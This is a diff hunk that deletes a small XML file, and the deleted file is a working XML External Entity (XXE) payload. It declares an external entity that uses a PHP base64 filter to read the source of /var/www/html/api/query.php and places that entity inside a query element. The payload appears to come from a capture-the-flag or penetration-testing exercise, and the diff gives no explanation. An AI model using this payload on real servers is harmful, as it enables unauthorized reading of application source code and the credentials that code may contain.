@@ -1,7 +1,0 @@
-<?xml version="1.0" encoding="utf-8"?> 
-<!DOCTYPE foo [
-<!ELEMENT foo ANY >
-<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/var/www/html/api/query.php" >]>
-<uccu>
-    <query>&xxe;</query>
-</uccu>
